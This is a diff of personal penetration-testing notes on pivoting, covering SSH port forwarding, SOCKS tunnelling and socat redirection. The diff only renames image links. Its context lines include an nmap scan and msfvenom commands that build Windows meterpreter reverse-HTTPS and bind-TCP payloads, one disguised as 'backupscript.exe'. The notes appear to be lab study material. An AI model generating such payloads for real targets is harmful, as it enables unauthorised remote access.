@@ -1,6 +1,6 @@
 
 ## #SSH local port forwarding
-![[Pasted image 20230808193825.png]]
+![[Pivotting.png]]
 ### Scan the pivot target 
 ```shell
 nmap -sT -p22,3306 10.129.202.64
@@ -27,7 +27,7 @@ To connect to the target machine from the local machine you can start a SOCKS li
 *This is called SSH tunneling over SOCKS proxy*
 
 Allows traffic to be route to the second target via the first machine. 
-![[Pasted image 20230808194526.png]]
+![[Pivotting over SSH.png]]
 
 #### Dynamic Port forwarding with SSH 
 
@@ -162,7 +162,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<pivot host ip> -f exe -
 ```
 Start a multi handler on port 80 
 ## Socat Redirection with a Bind Shell
-![[Pasted image 20230809111733.png]]
+![[Pivotting MSF.png]]
 ```shell
 msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
 ```
